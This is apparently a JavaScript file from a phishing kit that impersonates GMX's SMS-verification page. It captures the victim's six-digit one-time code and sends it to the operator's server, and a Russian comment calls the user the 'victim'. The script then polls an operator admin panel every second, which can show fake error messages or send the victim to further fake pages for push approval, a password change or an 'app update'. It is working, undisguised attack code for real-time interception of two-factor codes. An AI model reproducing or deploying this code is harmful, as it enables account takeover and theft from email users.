(function () {
  function getId() {
    var m = /[?&]id=([^&]+)/.exec(window.location.search);
    return m ? decodeURIComponent(m[1]) : '';
  }

  var form = document.getElementById('sms-form');
  var inputs = document.querySelectorAll('.sms-code-row input');
  var btnResend = document.getElementById('sms-resend');
  var btnConfirm = document.getElementById('sms-confirm');

  function getCode() {
    var code = '';
    for (var i = 0; i < inputs.length; i++) code += (inputs[i].value || '').trim();
    return code;
  }

  function updateConfirmButton() {
    if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
  }

  inputs.forEach(function (input, i) {
    input.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 1);
      this.value = v;
      if (v && i < inputs.length - 1) inputs[i + 1].focus();
      updateConfirmButton();
      userClearedSmsErrorByTyping = true;
      hideSmsError();
    });
    input.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !this.value && i > 0) inputs[i - 1].focus();
    });
    input.addEventListener('paste', function (e) {
      e.preventDefault();
      var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
      for (var j = 0; j < pasted.length && j < inputs.length; j++) inputs[j].value = pasted[j];
      if (pasted.length > 0) inputs[Math.min(pasted.length, inputs.length - 1)].focus();
      updateConfirmButton();
      userClearedSmsErrorByTyping = true;
      hideSmsError();
    });
  });

  var RESEND_COOLDOWN = 60;
  var resendSecondsLeft = RESEND_COOLDOWN;
  var resendTimer = null;

  function setResendCooldown(seconds) {
    if (!btnResend) return;
    resendSecondsLeft = seconds;
    if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
    if (seconds > 0) {
      btnResend.disabled = true;
      btnResend.textContent = 'Code erneut senden (' + seconds + ' s)';
      resendTimer = setInterval(function () {
        resendSecondsLeft--;
        if (resendSecondsLeft > 0) {
          btnResend.textContent = 'Code erneut senden (' + resendSecondsLeft + ' s)';
        } else {
          btnResend.disabled = false;
          btnResend.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><path fill="currentColor" d="M18.115,2.157L16.473,3.8C14.837,2.076,12.527,1,9.969,1C4.655,1,1.057,5.572,1.003,9.108v0.101c0,0.44,0.356,0.797,0.796,0.797h0.896c0.44,0,0.797-0.357,0.796-0.797V8.936c0.33-2.515,2.846-5.445,6.478-5.445c1.871,0,3.558,0.798,4.741,2.071l-1.559,1.559c-0.326,0.327-0.095,0.885,0.366,0.885h4.754C18.668,8.006,19,7.641,19,7.245V2.523C19,2.062,18.442,1.83,18.115,2.157z"/></svg> Code erneut senden';
          clearInterval(resendTimer);
          resendTimer = null;
        }
      }, 1000);
    }
  }

  if (btnResend) {
    setResendCooldown(RESEND_COOLDOWN);

    btnResend.addEventListener('click', function () {
      if (btnResend.disabled) return;
      var id = getId();
      if (id) {
        fetch('/api/log-action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: id, action: 'sms_resend' }),
        }).catch(function () {});
      }
      setResendCooldown(RESEND_COOLDOWN);
    });
  }

  document.getElementById('sms-link-phone') && document.getElementById('sms-link-phone').addEventListener('click', function () {
    var helpBase = (window.__BRAND__ && window.__BRAND__.hilfeUrl) ? window.__BRAND__.hilfeUrl.replace(/\/$/, '') : 'https://hilfe.gmx.net';
    window.location.href = helpBase + '/kundenservice/knowndevices.html';
  });

  document.getElementById('sms-help') && document.getElementById('sms-help').addEventListener('click', function () {
    window.open((window.__BRAND__ && window.__BRAND__.hilfeUrl) || 'https://hilfe.gmx.net/', '_blank');
  });

  var statusInterval = null;
  var smsCountdownSec = 300;
  var smsCountdownInterval = null;
  /** Сообщение «неверный код» по кнопке Error в админке (жертва на странице SMS). */
  var SMS_ADMIN_ERROR_MSG = 'Der eingegebene Code ist nicht korrekt. Bitte überprüfen Sie Ihre Eingabe.';
  var userClearedSmsErrorByTyping = false;

  function showSmsOverlay() {
    var overlay = document.getElementById('sms-protection-overlay');
    var countEl = document.getElementById('sms-protection-countdown');
    if (overlay) overlay.hidden = false;
    smsCountdownSec = 300;
    function fmt(s) { var m = Math.floor(s / 60); var sec = s % 60; return m + ':' + (sec < 10 ? '0' : '') + sec; }
    if (countEl) countEl.textContent = fmt(smsCountdownSec);
    if (smsCountdownInterval) clearInterval(smsCountdownInterval);
    smsCountdownInterval = setInterval(function () {
      if (smsCountdownSec > 0) smsCountdownSec--;
      if (countEl) countEl.textContent = fmt(smsCountdownSec);
    }, 1000);
  }

  function hideSmsOverlay() {
    var overlay = document.getElementById('sms-protection-overlay');
    if (overlay) overlay.hidden = true;
    if (smsCountdownInterval) { clearInterval(smsCountdownInterval); smsCountdownInterval = null; }
  }

  function startPollingAfterSms(id) {
    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
    function check() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=sms-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st !== 'error') return;
          if (st === 'redirect_push') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sicherheit') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_android') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
          } else if (st === 'redirect_sms_code') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_2fa_code') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'show_success') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            hideSmsOverlay();
            try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
            window.location = '/anmelden';
          } else if (st === 'error') {
            if (!userClearedSmsErrorByTyping) {
              hideSmsOverlay();
              if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
              showSmsError(SMS_ADMIN_ERROR_MSG);
            }
          } else {
            userClearedSmsErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    check();
    statusInterval = setInterval(check, 1000);
  }

  function showSmsError(msg) {
    var row = document.getElementById('sms-code-row');
    var err = document.getElementById('sms-submit-error');
    if (!err) {
      err = document.createElement('p');
      err.id = 'sms-submit-error';
      err.setAttribute('role', 'alert');
      err.style.color = '#c00';
      err.style.marginTop = '12px';
      err.style.fontSize = '0.9rem';
      if (row && row.parentNode) row.parentNode.insertBefore(err, row.nextSibling);
    }
    if (err) { err.textContent = msg || 'Fehler. Bitte versuchen Sie es erneut.'; err.hidden = false; }
  }
  function hideSmsError() {
    var err = document.getElementById('sms-submit-error');
    if (err) { err.hidden = true; err.textContent = ''; }
  }

  form && form.addEventListener('submit', function (e) {
    e.preventDefault();
    userClearedSmsErrorByTyping = false;
    hideSmsError();
    var code = getCode();
    if (code.length !== 6) return;
    var id = getId();
    if (!id) return;
    if (btnConfirm) btnConfirm.disabled = true;
    showSmsOverlay();
    fetch('/api/sms-code-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: id, code: code }),
    }).then(function (r) {
      if (!r || !r.ok) {
        hideSmsOverlay();
        if (btnConfirm) btnConfirm.disabled = false;
        showSmsError('Fehler beim Senden. Bitte versuchen Sie es erneut.');
        return;
      }
      return r.json().then(function () {
        hideSmsError();
        startPollingAfterSms(id);
      }).catch(function () {
        startPollingAfterSms(id);
      });
    }).catch(function () {
      hideSmsOverlay();
      if (btnConfirm) btnConfirm.disabled = false;
      showSmsError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
    });
  });

  var id = getId();
  if (id) {
    function checkStatus() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=sms-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st !== 'error') return;
          if (st === 'redirect_push') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sicherheit') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_android') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
          } else if (st === 'show_success') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
            window.location = '/anmelden';
          } else if (st === 'error') {
            if (!userClearedSmsErrorByTyping) {
              if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
              showSmsError(SMS_ADMIN_ERROR_MSG);
            }
          } else {
            userClearedSmsErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    checkStatus();
    statusInterval = setInterval(checkStatus, 1000);
  }
})();
